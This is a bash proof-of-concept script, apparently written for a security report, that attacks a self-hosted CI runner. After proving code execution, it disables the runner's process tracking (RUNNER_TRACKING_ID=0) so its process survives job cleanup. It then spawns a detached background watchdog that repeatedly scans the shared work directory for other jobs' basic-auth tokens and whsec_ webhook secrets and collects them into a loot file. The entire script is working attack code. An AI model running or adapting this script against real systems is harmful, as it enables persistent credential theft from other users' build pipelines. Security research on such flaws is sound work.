#!/bin/bash
echo "===== RCE PROOF: arbitrary attacker code on self-hosted runner ====="
id; hostname; whoami; uname -sm
echo "RUNNER_NAME=$RUNNER_NAME  TRACKING=$RUNNER_TRACKING_ID  workspace=$(pwd)"
echo "===== PERSISTENCE: watchdog surviving job-end (RUNNER_TRACKING_ID=0), harvesting OTHER jobs secrets ====="
export RUNNER_TRACKING_ID=0
setsid bash -c "
  echo \"[watchdog] pid \$\$ start \$(date -u) scanning /tmp/ar/_work\" > /tmp/loot.txt
  for i in \$(seq 1 60); do
    grep -rhoE \"AUTHORIZATION: basic [A-Za-z0-9+/=]{20,}\" /tmp/ar/_work 2>/dev/null | sort -u
    grep -rhoE \"whsec_[A-Za-z0-9]+\" /tmp/ar/_work 2>/dev/null | sort -u
    sleep 3
  done >> /tmp/loot.txt 2>&1
  echo \"[watchdog] end \$(date -u)\" >> /tmp/loot.txt
" </dev/null >/dev/null 2>&1 &
disown
echo "watchdog spawned pid $! - persists past job end"
